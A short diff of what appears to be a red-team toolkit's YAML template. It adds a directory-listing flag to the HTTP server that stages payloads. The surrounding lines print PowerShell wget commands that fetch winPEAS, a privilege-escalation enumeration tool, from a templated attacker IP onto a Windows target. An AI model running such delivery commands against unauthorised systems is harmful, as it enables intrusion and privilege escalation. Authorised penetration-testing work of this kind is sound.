@@ -18,4 +18,4 @@ content: |
   echo 'Deliver only (x64): powershell wget -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/winPEASx64.exe -Outfile {{ delivery_path_windows }}\winPEAS.exe'; \
   echo 'Deliver only (x86): powershell wget -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/winPEASx86.exe -Outfile {{ delivery_path_windows }}\winPEAS.exe'; \
   echo '================================================================'; \
-   python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound
+  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
